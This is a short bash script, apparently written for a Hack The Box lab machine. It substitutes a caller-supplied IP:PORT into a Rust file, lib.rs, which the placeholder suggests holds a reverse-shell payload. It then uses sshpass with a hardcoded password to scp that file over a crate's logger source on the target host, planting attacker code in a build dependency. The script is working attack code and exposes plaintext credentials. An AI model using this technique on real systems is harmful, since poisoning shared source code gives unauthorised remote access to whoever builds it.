#!/bin/bash

if [ $# -ne 1 ]; then
	echo "Error: full_atlas.sh IP:PORT"
	exit 1
fi

EXPLOIT=`cat lib.rs`
REPLACED=${EXPLOIT/IP:PORT/$1}

echo "$REPLACED" > tmp.rs
sshpass -p "quietLiketheWind23" scp tmp.rs silentobserver@ssa.htb:/opt/crates/logger/src/lib.rs
